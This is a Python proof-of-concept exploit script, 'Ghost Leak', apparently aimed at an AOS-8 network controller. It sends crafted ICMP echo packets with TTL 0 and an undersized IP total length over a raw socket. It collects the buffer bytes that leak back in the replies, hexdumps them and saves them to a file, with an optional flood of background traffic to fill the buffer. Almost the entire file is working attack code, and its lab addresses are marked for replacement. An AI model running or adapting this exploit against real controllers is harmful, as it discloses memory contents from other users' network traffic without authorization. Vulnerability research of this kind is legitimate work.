#!/usr/bin/env python3
"""
AOS-8 Chain 2 — "Ghost Leak" (Invisible Buffer Over-read)
TTL=0 + TotalLen=46 → 18B NIC buffer leak per request

The reproduction script has a known AF_PACKET receive timing issue that may cause it to report '0 rounds captured' despite successful exploitation. The packet capture (pcap) is the definitive evidence — filter for icmp.type == 0 && icmp.ident == 0xdead to see all controller replies.

Usage:
  Windows:  ping -t 192.168.56.50
  Parrot:   sudo python3 test_chain2.py --leak
  Or both:  sudo python3 test_chain2.py --combined

"""
import socket, struct, binascii, time, sys, threading, os, signal

INTERFACE    = "enp0s8"                     # CHANGE IT
TARGET_IP    = "192.168.56.50"              # CHANGE IT
SOURCE_IP    = "192.168.56.103"             # CHANGE IT 
TARGET_MAC   = "08:00:27:6d:6c:95"          # CHANGE IT
SOURCE_MAC   = "08:00:27:cc:05:43"          # CHANGE IT
LEAK_ROUNDS  = 50
LEAK_DELAY   = 0.1

leaked_data = bytearray()
total_leaked = 0
total_nonzero = 0
round_results = []
interrupted = False

def cksum(data):
    if len(data) % 2: data += b'\x00'
    s = 0
    for i in range(0, len(data), 2):
        s += data[i] | (data[i+1] << 8)
    while s >> 16: s = (s >> 16) + (s & 0xFFFF)
    return (~s) & 0xFFFF

ETH = None

def build_eth():
    d = binascii.unhexlify(TARGET_MAC.replace(":",""))
    s = binascii.unhexlify(SOURCE_MAC.replace(":",""))
    return struct.pack("!6s6sH", d, s, 0x0800)

def make_leak_packet(seq):
    icmp = bytearray(struct.pack('!BBHHH', 8, 0, 0, 0xDEAD, seq))
    c = cksum(bytes(icmp)); icmp[2]=c&0xFF; icmp[3]=(c>>8)&0xFF
    ip = bytearray(struct.pack('!BBHHHBBH4s4s',
        0x45, 0, 46, 0xBE00|(seq&0xFF), 0x4000, 0, 1, 0,
        socket.inet_aton(SOURCE_IP), socket.inet_aton(TARGET_IP)))
    c = cksum(bytes(ip)); ip[10]=c&0xFF; ip[11]=(c>>8)&0xFF
    return ETH + bytes(ip) + bytes(icmp)

def make_traffic_packet(seq):
    payload = os.urandom(64)
    icmp = bytearray(struct.pack('!BBHHH', 8, 0, 0, 0xAAAA, seq) + payload)
    c = cksum(bytes(icmp)); icmp[2]=c&0xFF; icmp[3]=(c>>8)&0xFF
    ip = bytearray(struct.pack('!BBHHHBBH4s4s',
        0x45, 0, 20+len(icmp), 0xAA00|(seq&0xFF), 0x4000, 64, 1, 0,
        socket.inet_aton(SOURCE_IP), socket.inet_aton(TARGET_IP)))
    c = cksum(bytes(ip)); ip[10]=c&0xFF; ip[11]=(c>>8)&0xFF
    return ETH + bytes(ip) + bytes(icmp)

def save_results():
    print(f"\n\n{'='*60}")
    print(f" GHOST LEAK RESULTS")
    print(f"{'='*60}")
    print(f"  Rounds:        {len(round_results)}")
    print(f"  Total leaked:  {total_leaked} bytes")
    print(f"  Non-zero:      {total_nonzero} bytes")
    if total_leaked > 0:
        print(f"  Non-zero rate: {(total_nonzero/total_leaked)*100:.1f}%")
    if total_nonzero > 0:
        print(f"\n  ◄◄◄ NON-ZERO BYTES DETECTED!")
        print(f"  CWE-126 + CWE-1284 — CVE-2003-0001 class")
        print(f"\n  Leaked data:")
        for i in range(0, min(len(leaked_data), 512), 16):
            h = ' '.join(f'{b:02x}' for b in leaked_data[i:i+16])
            a = ''.join(chr(b) if 32<=b<127 else '.' for b in leaked_data[i:i+16])
            print(f"    {i:04x}: {h:<48} {a}")
    else:
        print(f"\n  All zeros — need more background traffic")
    if leaked_data:
        with open('ghost_leak_dump.bin', 'wb') as f:
            f.write(leaked_data)
        print(f"\n  Saved: ghost_leak_dump.bin ({len(leaked_data)}B)")
    else:
        print(f"\n  No data to save.")
    print(f"{'='*60}")

def traffic_generator(stop_event, duration=60):
    try:
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
        sock.bind((INTERFACE, 0))
        print(f"  [TRAFFIC] Background traffic running ({duration}s)...")
        start = time.time()
        count = 0
        while not stop_event.is_set() and time.time()-start < duration:
            sock.send(make_traffic_packet(count % 0xFFFF))
            count += 1
            time.sleep(0.005)
        print(f"  [TRAFFIC] Done. Sent {count} packets.")
        sock.close()
    except Exception as e:
        print(f"  [TRAFFIC] Error: {e}")

def ghost_leak(wait=0):
    global leaked_data, total_leaked, total_nonzero, round_results, interrupted

    print(f"\n{'='*60}")
    print(f" CHAIN 2 — Ghost Leak")
    print(f" TTL=0 + TotalLen=46 → 18B over-read")
    print(f" {LEAK_ROUNDS} rounds | Ctrl+C saves and exits")
    print(f" Capture: sudo tcpdump -i {INTERFACE} -w chain2.pcap")
    print(f"{'='*60}")

    if wait > 0:
        print(f"\n  Waiting {wait}s for buffer fill...")
        time.sleep(wait)

    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    sock.bind((INTERFACE, 0))
    sock.settimeout(1)
    ctrl_mac = binascii.unhexlify(TARGET_MAC.replace(":",""))

    print(f"\n  Sending ghost packets...\n")

    for i in range(LEAK_ROUNDS):
        if interrupted:
            print(f"\n  [!] Stopped at round {i}")
            break

        sock.send(make_leak_packet(i))

        try:
            deadline = time.time() + 1
            while time.time() < deadline:
                try:
                    resp = sock.recv(65535)
                except socket.timeout:
                    break
                if len(resp) < 42: continue
                if resp[6:12] != ctrl_mac: continue
                if struct.unpack("!H", resp[12:14])[0] != 0x0800: continue
                if resp[23] != 1 or resp[34] != 0: continue
                if struct.unpack("!H", resp[38:40])[0] != 0xDEAD: continue

                reply_tl = struct.unpack("!H", resp[16:18])[0]
                pl = reply_tl - 28
                if pl > 0:
                    leak = resp[42:42+pl]
                    nz = sum(1 for b in leak if b != 0)
                    total_leaked += len(leak)
                    total_nonzero += nz
                    leaked_data.extend(leak)
                    round_results.append((len(leak), nz, bytes(leak)))
                    if nz > 0:
                        print(f"  [{i:3d}] {len(leak)}B ◄ {nz} NON-ZERO: {leak.hex()}")
                    elif i % 10 == 0:
                        print(f"  [{i:3d}] {len(leak)}B (zeros)")
                break
        except Exception:
            pass

        time.sleep(LEAK_DELAY)

    sock.close()
    save_results()

def combined_mode():
    global interrupted
    print(f"{'='*60}")
    print(f" COMBINED — Traffic + Ghost Leak")
    print(f" Ctrl+C stops everything and saves")
    print(f"{'='*60}")

    stop_event = threading.Event()
    traffic = threading.Thread(target=traffic_generator, args=(stop_event, 60))
    traffic.daemon = True
    traffic.start()

    ghost_leak(wait=5)
    stop_event.set()
    traffic.join(timeout=3)

def main():
    global ETH, interrupted

    def sigint_handler(sig, frame):
        global interrupted
        interrupted = True

    signal.signal(signal.SIGINT, sigint_handler)
    ETH = build_eth()

    if len(sys.argv) < 2:
        print("Chain 2 — Ghost Leak")
        print(f"\n  sudo python3 {sys.argv[0]} --traffic    Background only")
        print(f"  sudo python3 {sys.argv[0]} --leak       Leak only")
        print(f"  sudo python3 {sys.argv[0]} --combined   Both together")
        print(f"\nBest: Windows 'ping -t {TARGET_IP}' then --leak")
        sys.exit(0)

    mode = sys.argv[1].lower()
    if mode == "--traffic":
        stop = threading.Event()
        try:
            traffic_generator(stop, 120)
        except KeyboardInterrupt:
            stop.set()
    elif mode == "--leak":
        ghost_leak()
    elif mode == "--combined":
        combined_mode()

if __name__ == '__main__':
    main()
